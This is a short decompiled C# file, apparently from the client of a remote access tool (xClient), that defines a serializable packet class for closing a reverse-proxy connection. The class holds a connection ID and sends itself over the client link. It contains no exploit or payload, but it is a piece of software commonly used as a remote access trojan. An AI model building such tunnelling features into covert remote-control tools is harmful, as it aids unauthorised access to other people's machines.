using System;
using xClient.Core.Networking;
using xClient.Core.Packets;

namespace xClient.Core.ReverseProxy.Packets
{
	// Token: 0x020000D6 RID: 214
	[Serializable]
	public class ReverseProxyDisconnect : IPacket
	{
		// Token: 0x170000FD RID: 253
		// (get) Token: 0x06000558 RID: 1368 RVA: 0x0000491B File Offset: 0x00002B1B
		// (set) Token: 0x06000559 RID: 1369 RVA: 0x00004923 File Offset: 0x00002B23
		public int ConnectionId { get; set; }

		// Token: 0x0600055A RID: 1370 RVA: 0x0000492C File Offset: 0x00002B2C
		public ReverseProxyDisconnect(int connectionId)
		{
			this.ConnectionId = connectionId;
		}

		// Token: 0x0600055B RID: 1371 RVA: 0x000021D4 File Offset: 0x000003D4
		public ReverseProxyDisconnect()
		{
		}

		// Token: 0x0600055C RID: 1372 RVA: 0x0000493B File Offset: 0x00002B3B
		public void Execute(Client client)
		{
			client.Send<ReverseProxyDisconnect>(this);
		}
	}
}
